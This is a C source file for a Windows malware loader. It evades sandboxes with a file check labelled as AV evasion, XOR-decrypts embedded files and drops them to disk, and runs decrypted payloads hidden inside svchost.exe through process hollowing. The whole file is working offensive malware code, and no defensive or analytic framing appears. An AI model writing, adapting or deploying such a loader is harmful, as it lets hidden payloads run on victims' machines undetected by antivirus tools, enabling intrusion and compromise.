#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include "runPE.h"
#include "payloads.h"

int main() {	
	FILE *currentDropfile;
	
	// AV evasion: Anti-sandbox via fopen
	// If program is sandboxed, fp should be null and program exits, sandboxing stops.
	// If file can be opened, continue.
	FILE *fp = fopen("C:\\Windows\\system.ini", "rb");
	if (fp == NULL) {
		return 0;
	}
	fclose(fp);	
	
	// Designate hollowing target and desired current directory
	char target[] = "C:\\Windows\\System32\\svchost.exe";
	char desiredCurrentDirectory[] = "C:\\Windows\\System32";
	
	// Iterate dropfiles
	for(int i=0; i < dropfileCount; i++) {		
		// Decrypt dropfile before dropping
		for(int j=0; j < dropfileSizes[i]; j++) {
			dropfiles[i][j] = dropfiles[i][j] ^ dropfileKeys[i];
		}
		
		// Decrypt the dropfile destination before dropping
		for(int j=0; j < dropfileDestinationSizes[i]; j++) {
			dropfileDestinations[i][j] = dropfileDestinations[i][j] ^ dropfileKeys[i];
		}				
		
		// Drop file on destination
		printf("Attempting to drop file %d, file size is %ld, destination is '%s'\n", i, dropfileSizes[i], (char *) dropfileDestinations[i]);				
		if(access((char *) dropfileDestinations[i], F_OK) == 0) {
			printf("File with desired name already exists or no write permission on destination. Skip dropping.\n");
		} else {
			currentDropfile = fopen((char *) dropfileDestinations[i], "wb");
			if(fwrite(dropfiles[i], dropfileSizes[i], 1, currentDropfile)) {
				printf("Success.\n");
			}	
			fclose(currentDropfile);
		}									
	}	
	
	// Iterate payloads
	for(int i=0; i < payloadCount; i++) {	
		// Decrypt payload before instanciation
		for(int j=0; j < payloadSizes[i]; j++) {
			payloads[i][j] = payloads[i][j] ^ keys[i];
		}
		
		// Decrypt the payload's command line before instanciation
		for(int j=0; j < commandLineSizes[i]; j++) {
			commandLines[i][j] = commandLines[i][j] ^ keys[i];
		}
				
		// Spawn payloads as runPE
		printf("\n Instanciating payload %d as svchost.exe, command line is '%s'\n", i, (char *) commandLines[i]);			
		newRunPE(target, desiredCurrentDirectory, payloads[i], LPTSTR(commandLines[i]));			
	}
				
	return 0;
}	
